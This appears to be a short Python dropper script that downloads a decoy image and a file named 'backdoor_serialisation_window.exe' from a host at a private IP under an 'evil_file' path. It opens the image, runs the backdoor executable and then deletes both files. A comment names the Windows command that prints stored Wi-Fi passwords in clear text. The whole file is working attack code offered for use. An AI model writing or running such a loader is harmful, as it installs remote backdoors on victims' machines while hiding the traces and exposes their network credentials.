#!/usr/bin/env python
import requests, subprocess, os, tempfile
def download(url):
	get_respone = requests.get(url)
	file_name = url.split("/")[-1]
	with open (file_name, "wb") as out_file:
		out_file.write (get_respone.content)


temp_directory = tempfile.gettempdir()
os.chdir(temp_directory)

download("http://192.168.220.35/evil_file/own.jpg")
###For Window###
##netsh wlan show profile wifi-name key=clear

subprocess.Popen("own.jpg", shell=True)
download("http://192.168.220.35/evil_file/backdoor_serialisation_window.exe")

subprocess.Popen("backdoor_serialisation_window.exe", shell=True)


os.remove("own.jpg")
os.remove("backdoor_serialisation_window.exe")




